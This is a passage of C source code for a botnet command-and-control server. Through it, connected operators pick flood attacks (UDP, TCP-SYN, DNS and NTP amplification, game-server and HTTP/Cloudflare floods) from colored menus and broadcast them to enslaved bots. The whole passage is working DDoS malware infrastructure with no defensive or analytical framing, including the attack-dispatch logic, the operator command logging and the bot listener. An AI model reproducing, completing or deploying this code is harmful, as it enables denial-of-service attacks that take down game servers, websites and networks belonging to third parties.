			sprintf(ls10, "\x1b[1;37m║ [\x1b[0;35mUDP-RAW\x1b[1;37m]  ~ \x1b[0;31m!* UDP-RAW IP PORT TIME              \x1b[1;37m| \x1b[0;35mLaunch A UDP-RAW Flood   \x1b[1;37m║\r\n");
			sprintf(ls11, "\x1b[1;37m║ [\x1b[0;35mUDP-PPS\x1b[1;37m]  ~ \x1b[0;31m!* UDP-PPS IP PORT TIME              \x1b[1;37m| \x1b[0;35mLaunch A UDP-PPS Flood   \x1b[1;37m║\r\n");
			sprintf(ls12, "\x1b[1;37m║ [\x1b[0;35mTCP-SYN\x1b[1;37m]  ~ \x1b[0;31m!* TCP-SYN IP PORT TIME              \x1b[1;37m| \x1b[0;35mLaunch A TCP-SYN Flood   \x1b[1;37m║\r\n");
			sprintf(ls13, "\x1b[1;37m║ [\x1b[0;35mSTD\x1b[1;37m]      ~ \x1b[0;31m!* STD IP PORT TIME                  \x1b[1;37m| \x1b[0;35mLaunch A STD Flood       \x1b[1;37m║\r\n");
			sprintf(ls14, "\x1b[1;37m║ [\x1b[0;35mHEX\x1b[1;37m]      ~ \x1b[0;31m!* HEX IP PORT TIME                  \x1b[1;37m| \x1b[0;35mLaunch A HEX Flood       \x1b[1;37m║\r\n");
			sprintf(ls15, "\x1b[1;37m║ [\x1b[0;35mRANDHEX\x1b[1;37m]  ~ \x1b[0;31m!* RANDHEX IP PORT TIME              \x1b[1;37m| \x1b[0;35mLaunch A RANDHEX Flood   \x1b[1;37m║\r\n");
			sprintf(ls16, "\x1b[1;37m║ [\x1b[0;35mDNS-AMP\x1b[1;37m]  ~ \x1b[0;31m!* DNS-AMP IP PORT TIME              \x1b[1;37m| \x1b[0;35mLaunch A DNS-AMP Flood   \x1b[1;37m║\r\n");
			sprintf(ls17, "\x1b[1;37m║ [\x1b[0;35mNTP-AMP\x1b[1;37m]  ~ \x1b[0;31m!* NTP-AMP IP PORT TIME              \x1b[1;37m| \x1b[0;35mLaunch A NTP-AMP Flood   \x1b[1;37m║\r\n");
			sprintf(ls18, "\x1b[1;37m╚══════════════════════════════════════════════════════════════════════════════╝\r\n");
			sprintf(ls19, " \r\n");
			sprintf(ls20, " \r\n");
			sprintf(ls21, " \r\n");
			sprintf(ls22, " \r\n");

			if(send(datafd, ls1,  strlen(ls1),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls2,  strlen(ls2),	MSG_NOSIGNAL) == -1) goto end;				
			if(send(datafd, ls3,  strlen(ls3),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls4,  strlen(ls4),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls5,  strlen(ls5),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls6,  strlen(ls6),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls7,  strlen(ls7),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls8,  strlen(ls8),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls9,  strlen(ls9),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls10,  strlen(ls10),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls11,  strlen(ls11),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls12,  strlen(ls12),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls13,  strlen(ls13),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls14,  strlen(ls14),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls15,  strlen(ls15),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls16,  strlen(ls16),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls17,  strlen(ls17),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls18, strlen(ls18),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls19, strlen(ls19), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls20, strlen(ls20), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls21, strlen(ls21), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls22, strlen(ls22), MSG_NOSIGNAL) == -1) goto end;

			
			char servTag [100];
			char input [5000];
			char username[100];
			get_username(client_ip, username);
			sprintf(servTag, "\x1b[1;35m╔══\x1b[1;37m[\x1b[0;35m%s\x1b[0;37m@\x1b[0;35mSSP\x1b[1;37m]\n", username);
			sprintf(input, "\r\x1b[1;35m╚═══\x1b[1;37m> ");
		}

		else if (strncmp(buf, "GAME", 4) == 0) 
		{
			

			char clearscreen [2048];
			memset(clearscreen, 0, 2048);
			sprintf(clearscreen, "\033[2J\033[1;1H");
			if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;

			char ls1   [160];
			char ls2   [160];
			char ls3   [160];
			char ls4   [160];
			char ls5   [160];
			char ls6   [160];
			char ls7   [160];
			char ls8   [160];
			char ls9   [160];
			char ls10   [160];
			char ls11   [160];
			char ls12   [160];
			char ls13   [160];
			char ls14   [160];
			char ls15   [160];
			char ls16   [160];
			char ls17   [160];
			char ls18   [160];
			char ls19   [160];
			char ls20   [160];
			char ls21   [160];
			char ls22   [160];

			sprintf(ls1,  " \r\n");
			sprintf(ls2,  "\x1b[0;35m                                  ╔═╗╔═╗╔╦╗╔═╗                                  \r\n");
			sprintf(ls3,  "\x1b[0;35m                                  ║ ╦╠═╣║║║║╣                                   \r\n");
			sprintf(ls4,  "\x1b[1;37m                  ╔╗              \x1b[0;35m╚═╝╩ ╩╩ ╩╚═╝              \x1b[1;37m╔╗                  \r\n");
			sprintf(ls5,  "\x1b[1;37m                   ╚╦══════════════════════════════════════╦╝                   \r\n");
			sprintf(ls6,  "\x1b[1;37m                    ║          \x1b[0;35mList Of Game Methods        \x1b[1;37m║                    \r\n");
			sprintf(ls7,  "\x1b[1;37m                    ╚════╦════════════════════════════╦════╝\r\n");
			sprintf(ls8,  "\x1b[1;37m                         ║                            ║\r\n");
			sprintf(ls9,  "\x1b[1;37m╔════════════════════════╩════════════════════════════╩════════════════════════╗\r\n");
			sprintf(ls10, "\x1b[1;37m║ [\x1b[0;35mFIVEM\x1b[1;37m]      ~ \x1b[0;31m!* FIVEM IP PORT TIME              \x1b[1;37m| \x1b[0;35mLaunch A FIVEM Flood     \x1b[1;37m║\r\n");
			sprintf(ls11, "\x1b[1;37m║ [\x1b[0;35mMINECRAFT\x1b[1;37m]  ~ \x1b[0;31m!* MINECRAFT IP PORT TIME          \x1b[1;37m| \x1b[0;35mLaunch A MINECRAFT Flood \x1b[1;37m║\r\n");
			sprintf(ls12, "\x1b[1;37m║ [\x1b[0;35mROBLOX\x1b[1;37m]     ~ \x1b[0;31m!* ROBLOX IP PORT TIME             \x1b[1;37m| \x1b[0;35mLaunch A ROBLOX Flood    \x1b[1;37m║\r\n");
			sprintf(ls13, "\x1b[1;37m║ [\x1b[0;35mZAP\x1b[1;37m]        ~ \x1b[0;31m!* ZAP IP PORT TIME                \x1b[1;37m| \x1b[0;35mLaunch A ZAP Flood       \x1b[1;37m║\r\n");
			sprintf(ls14, "\x1b[1;37m║ [\x1b[0;35mCSGO\x1b[1;37m]       ~ \x1b[0;31m!* CSGO IP PORT TIME               \x1b[1;37m| \x1b[0;35mLaunch A CSGO Flood      \x1b[1;37m║\r\n");
			sprintf(ls15, "\x1b[1;37m║ [\x1b[0;35mOVH-GAME\x1b[1;37m]   ~ \x1b[0;31m!* OVH-GAME IP PORT TIME           \x1b[1;37m| \x1b[0;35mLaunch A OVH Flood       \x1b[1;37m║\r\n");
			sprintf(ls16, "\x1b[1;37m╚══════════════════════════════════════════════════════════════════════════════╝\r\n");
			sprintf(ls17, " \r\n");
			sprintf(ls18, " \r\n");
			sprintf(ls19, " \r\n");
			sprintf(ls20, " \r\n");
			sprintf(ls21, " \r\n");
			sprintf(ls22, " \r\n");

			if(send(datafd, ls1,  strlen(ls1),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls2,  strlen(ls2),	MSG_NOSIGNAL) == -1) goto end;				
			if(send(datafd, ls3,  strlen(ls3),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls4,  strlen(ls4),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls5,  strlen(ls5),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls6,  strlen(ls6),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls7,  strlen(ls7),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls8,  strlen(ls8),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls9,  strlen(ls9),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls10,  strlen(ls10),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls11,  strlen(ls11),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls12,  strlen(ls12),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls13,  strlen(ls13),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls14,  strlen(ls14),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls15,  strlen(ls15),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls16,  strlen(ls16),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls17,  strlen(ls17),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls18, strlen(ls18),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls19, strlen(ls19), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls20, strlen(ls20), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls21, strlen(ls21), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls22, strlen(ls22), MSG_NOSIGNAL) == -1) goto end;

			
			char servTag [100];
			char input [5000];
			char username[100];
			get_username(client_ip, username);
			sprintf(servTag, "\x1b[1;35m╔══\x1b[1;37m[\x1b[0;35m%s\x1b[0;37m@\x1b[0;35mSSP\x1b[1;37m]\n", username);
			sprintf(input, "\r\x1b[1;35m╚═══\x1b[1;37m> ");
		}

		else if (strncmp(buf, "WEBSITE", 7) == 0) 
		{
			

			char clearscreen [2048];
			memset(clearscreen, 0, 2048);
			sprintf(clearscreen, "\033[2J\033[1;1H");
		 	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;

			char ls1   [160];
			char ls2   [160];
			char ls3   [160];
			char ls4   [160];
			char ls5   [160];
			char ls6   [160];
			char ls7   [160];
			char ls8   [160];
			char ls9   [160];
			char ls10   [160];
			char ls11   [160];
			char ls12   [160];
			char ls13   [160];
			char ls14   [160];
			char ls15   [160];
			char ls16   [160];
			char ls17   [160];
			char ls18   [160];
			char ls19   [160];
			char ls20   [160];
			char ls21   [160];
			char ls22   [160];

			sprintf(ls1,  " \r\n");
			sprintf(ls2,  "\x1b[0;35m                               ╦ ╦╔═╗╔╗ ╔═╗╦╔╦╗╔═╗                              \r\n");
			sprintf(ls3,  "\x1b[0;35m                               ║║║║╣ ╠╩╗╚═╗║ ║ ║╣                               \r\n");
			sprintf(ls4,  "\x1b[1;37m                  ╔╗           \x1b[0;35m╚╩╝╚═╝╚═╝╚═╝╩ ╩ ╚═╝          \x1b[1;37m╔╗                  \r\n");
			sprintf(ls5,  "\x1b[1;37m                   ╚╦══════════════════════════════════════╦╝                   \r\n");
			sprintf(ls6,  "\x1b[1;37m                    ║        \x1b[0;35mList Of Website Methods       \x1b[1;37m║                    \r\n");
			sprintf(ls7,  "\x1b[1;37m                    ╚════╦════════════════════════════╦════╝                    \r\n");
			sprintf(ls8,  "\x1b[1;37m                         ║                            ║\r\n");
			sprintf(ls9,  "\x1b[1;37m╔════════════════════════╩════════════════════════════╩════════════════════════╗\r\n");
			sprintf(ls10, "\x1b[1;37m║ [\x1b[0;35mHTTP\x1b[1;37m]        ~ \x1b[0;31m!* HTTP IP PORT TIME         \x1b[1;37m| \x1b[0;35mLaunch A HTTP GET Flood       \x1b[1;37m║\r\n");
			sprintf(ls11, "\x1b[1;37m║ [\x1b[0;35mHTTPS\x1b[1;37m]       ~ \x1b[0;31m!* HTTPS URL PORT TIME       \x1b[1;37m| \x1b[0;35mLaunch A HTTPS GET Flood      \x1b[1;37m║\r\n");
			sprintf(ls12, "\x1b[1;37m║ [\x1b[0;35mCLOUDFLARE\x1b[1;37m]  ~ \x1b[0;31m!* CLOUDFLARE URL PORT TIME  \x1b[1;37m| \x1b[0;35mLaunch A CLOUDFLARE GET Flood \x1b[1;37m║\r\n");
			sprintf(ls13, "\x1b[1;37m║ [\x1b[0;35mOVH-HTTP\x1b[1;37m]    ~ \x1b[0;31m!* OVH-HTTP IP PORT TIME     \x1b[1;37m| \x1b[0;35mLaunch A OVH GET Flood        \x1b[1;37m║\r\n");
			sprintf(ls14, "\x1b[1;37m╚══════════════════════════════════════════════════════════════════════════════╝\r\n");
			sprintf(ls15, " \r\n");
			sprintf(ls16, " \r\n");
			sprintf(ls17, " \r\n");
			sprintf(ls18, " \r\n");
			sprintf(ls19, " \r\n");
			sprintf(ls20, " \r\n");
			sprintf(ls21, " \r\n");
			sprintf(ls22, " \r\n");

			if(send(datafd, ls1,  strlen(ls1),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls2,  strlen(ls2),	MSG_NOSIGNAL) == -1) goto end;				
			if(send(datafd, ls3,  strlen(ls3),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls4,  strlen(ls4),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls5,  strlen(ls5),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls6,  strlen(ls6),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls7,  strlen(ls7),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls8,  strlen(ls8),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls9,  strlen(ls9),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls10,  strlen(ls10),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls11,  strlen(ls11),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls12,  strlen(ls12),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls13,  strlen(ls13),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls14,  strlen(ls14),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls15,  strlen(ls15),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls16,  strlen(ls16),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls17,  strlen(ls17),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls18, strlen(ls18),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls19, strlen(ls19), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls20, strlen(ls20), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls21, strlen(ls21), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls22, strlen(ls22), MSG_NOSIGNAL) == -1) goto end;
			
			
			char servTag [100];
			char input [5000];
			char username[100];
			get_username(client_ip, username);
			sprintf(servTag, "\x1b[1;35m╔══\x1b[1;37m[\x1b[0;35m%s\x1b[0;37m@\x1b[0;35mSSP\x1b[1;37m]\n", username);
			sprintf(input, "\r\x1b[1;35m╚═══\x1b[1;37m> ");
				
			if(send(datafd, servTag, strlen(servTag), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;			
			continue;
		}

		trim(buf);
		char servTag [100];
		char input [5000];
		char username[100];
		get_username(client_ip, username);
		sprintf(servTag, "\x1b[1;35m╔══\x1b[1;37m[\x1b[0;35m%s\x1b[0;37m@\x1b[0;35mSSP\x1b[1;37m]\n", username);
		sprintf(input, "\r\x1b[1;35m╚═══\x1b[1;37m> ");
		if(send(datafd, servTag, strlen(servTag), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(strlen(buf) == 0) continue;
		printf("%s: \"%s\"\n",username, buf);

		FILE *LogFile;
		LogFile = fopen("user.log", "a");
		time_t now;
		struct tm *gmt;
		char formatted_gmt [50];
		char lcltime[50];
		now = time(NULL);
		gmt = gmtime(&now);
		strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
		username;
		fprintf(LogFile, "[%s] IP > %s User > %s Command > %s\n", formatted_gmt, client_ip, username, buf);
		fclose(LogFile);
		username;
		
		unsigned char *command = buf;

		unsigned char *params[10];
		int paramsCount = 1;
		unsigned char *pch = strtok(buf, " ");
		params[0] = command;

		while(pch)
		{
			if(*pch != '\n')
			{
				params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
				memset(params[paramsCount], 0, strlen(pch) + 1);
				strcpy(params[paramsCount], pch);
				paramsCount++;
			}
			pch = strtok(NULL, " ");
		}

		unsigned char *attackTime = params[5];
		int attackTimeToWait = atoi(attackTime);

		if(strncmp(params[2], "STOP", 4) != 0)
		{
			if(attacksRunning >= maxAttacksRunning)
			{
				goto Banner;
			}
			else if(attacksRunning < maxAttacksRunning)
			{
				pthread_t new_thread;
				pthread_create(&new_thread, NULL, attacksRunningTimer, &attackTimeToWait);

				attackTimeThreads[num_threads++] = new_thread;

				totalAttacks++;

				broadcast(buf, datafd, username);
				memset(buf, 0, 2048);
				goto Banner;
			}
			else
			{
				goto Banner;
			}
		}
		else if(strncmp(params[2], "STOP", 4) == 0)
		{
			if(num_threads > 0)
			{
				int i;
				for (i = 0; i < num_threads; i++) 
				{
					pthread_cancel(attackTimeThreads[i]);
				}
				num_threads = 0;

				attacksRunning = 0;
				broadcast(buf, datafd, username);
				memset(buf, 0, 2048);

				goto Banner;
			}
			else
			{
				broadcast(buf, datafd, username);
				memset(buf, 0, 2048);

				goto Banner;
			}
		}
		else
		{
			goto Banner;
		}

		if (strncmp(buf, "CLEAR", 5) == 0 || strncmp(buf, "clear", 5) == 0 || strncmp(buf, "cls", 3) == 0 || strncmp(buf, "CLS", 3) == 0) 
		{
			char clearscreen [2048];
			memset(clearscreen, 0, 2048);
			sprintf(clearscreen, "\033[2J\033[1;1H");
			if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ascii_banner_line10, strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ascii_banner_line11, strlen(ascii_banner_line11), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ascii_banner_line12, strlen(ascii_banner_line12), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ascii_banner_line13, strlen(ascii_banner_line13), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ascii_banner_line14, strlen(ascii_banner_line14), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ascii_banner_line15, strlen(ascii_banner_line15), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ascii_banner_line16, strlen(ascii_banner_line16), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ascii_banner_line17, strlen(ascii_banner_line17), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ascii_banner_line18, strlen(ascii_banner_line18), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ascii_banner_line19, strlen(ascii_banner_line19), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ascii_banner_line20, strlen(ascii_banner_line20), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ascii_banner_line21, strlen(ascii_banner_line21), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ascii_banner_line22, strlen(ascii_banner_line22), MSG_NOSIGNAL) == -1) goto end;

			while(1) 
			{
				char servTag [100];
				char input [5000];
				char username[100];
				get_username(client_ip, username);
				sprintf(servTag, "\x1b[1;35m╔══\x1b[1;37m[\x1b[0;35m%s\x1b[0;37m@\x1b[0;35mSSP\x1b[1;37m]\n", username);
				sprintf(input, "\r\x1b[1;35m╚═══\x1b[1;37m> ");
				if(send(datafd, servTag, strlen(servTag), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
			}
			continue;
		}

		trim(buf);
		get_username(client_ip, username);
		sprintf(servTag, "\x1b[1;35m╔══\x1b[1;37m[\x1b[0;35m%s\x1b[0;37m@\x1b[0;35mSSP\x1b[1;37m]\n", username);
		sprintf(input, "\r\x1b[1;35m╚═══\x1b[1;37m> ");
		if(send(datafd, servTag, strlen(servTag), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(strlen(buf) == 0) continue;
		printf("%s: \"%s\"\n",username, buf);

		LogFile = fopen("user.log", "a");
		now = time(NULL);
		gmt = gmtime(&now);
		strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
		username;
		fprintf(LogFile, "[%s] IP > %s User > %s Command > %s\n", formatted_gmt, client_ip, username, buf);
		fclose(LogFile);
		username;

		params[0] = command;

		while(pch)
		{
			if(*pch != '\n')
			{
				params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
				memset(params[paramsCount], 0, strlen(pch) + 1);
				strcpy(params[paramsCount], pch);
				paramsCount++;
			}
			pch = strtok(NULL, " ");
		}

		if(strncmp(params[2], "STOP", 4) != 0)
		{
			if(attacksRunning >= maxAttacksRunning)
			{
				goto Banner;
			}
			else if(attacksRunning < maxAttacksRunning)
			{
				pthread_t new_thread;
				pthread_create(&new_thread, NULL, attacksRunningTimer, &attackTimeToWait);

				attackTimeThreads[num_threads++] = new_thread;

				totalAttacks++;

				broadcast(buf, datafd, username);
				memset(buf, 0, 2048);
				goto Banner;
			}
			else
			{
				goto Banner;
			}
		}
		else if(strncmp(params[2], "STOP", 4) == 0)
		{
			if(num_threads > 0)
			{
				int i;
				for (i = 0; i < num_threads; i++) 
				{
					pthread_cancel(attackTimeThreads[i]);
				}
				num_threads = 0;

				attacksRunning = 0;
				broadcast(buf, datafd, username);
				memset(buf, 0, 2048);

				goto Banner;
			}
			else
			{
				broadcast(buf, datafd, username);
				memset(buf, 0, 2048);

				goto Banner;
			}
		}
		else
		{
			goto Banner;
		}
	}
	end:
	managements[datafd].connected = 0;
	close(datafd);
	OperatorsConnected--;
}

void *BotListener(int port) 
{
	int sockfd, newsockfd;
	socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);

    while(1) 
	{
		newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
		pthread_t thread;
        pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);

		inet_ntop(AF_INET, &(cli_addr.sin_addr), client_ip, INET_ADDRSTRLEN);
	}
}

int main (int argc, char *argv[], void *sock) 
{
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;

        if (argc != 4) 
		{
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }

		port = atoi(argv[3]);
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);

        if (s == -1) 
		{
			perror ("listen");
			abort ();
        }

        epollFD = epoll_create1 (0);

        if (epollFD == -1) 
		{
			perror ("epoll_create");
			abort ();
        }

        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);

        if (s == -1) 
		{
			perror ("epoll_ctl");
			abort ();
        }

        pthread_t thread[threads + 2];

        while(threads--) 
		{
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }

        pthread_create(&thread[0], NULL, &BotListener, port);

        while(1) 
		{
			broadcast("PING", -1, "ZERO");
			sleep(60);
        }

        close (listenFD);
        return EXIT_SUCCESS;
}
